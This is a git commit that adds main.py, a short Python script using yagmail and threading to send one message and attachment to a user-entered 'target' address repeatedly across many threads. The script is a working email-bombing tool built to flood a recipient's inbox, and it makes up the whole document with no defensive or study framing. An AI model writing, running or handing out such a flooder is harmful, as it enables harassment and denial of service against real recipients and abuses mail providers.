a056e2b8ec491b8cd654823c79feb14f42e24b03
Cyanide <77383465+AnirveshArcot@users.noreply.github.com>
2021-09-23 23:05:42 +0530

    create main.py

---
+++ main.py
@@ -0,0 +1,34 @@
+import threading 
+import yagmail
+import os
+
+def mail(sm,pwd,rm,sub,mes):
+    yag = yagmail.SMTP(user=sm,password=pwd)
+    yag.send(to=rm,subject=sub,contents=mes)
+
+user_file=open("user.txt","r")
+sendermail=user_file.readline()
+password=user_file.readline()
+receivemail=input("Enter target: ")
+subject=input("Enter subject: ")
+message=input("Enter message: ")
+thread_count=int(input("Enter number of threads: "))
+times=int(input("Enter number of times the threads have to run: "))
+atat=input("Enter attachment file name with extention: ")
+direc=os.getcwd()
+fulldirec=direc+"\\"+atat
+contents=[message,fulldirec]
+
+for j in range (times):
+    threads = []
+    for i in range (thread_count):
+        x= threading.Thread(target=mail,args=(sendermail,password,receivemail,subject,contents))
+        x.daemon=True
+        threads.append(x) 
+    for i in range (thread_count):
+        threads[i].start()
+    for i in range (thread_count):
+        threads[i].join()
+
+print("Done!")
+user_file.close()
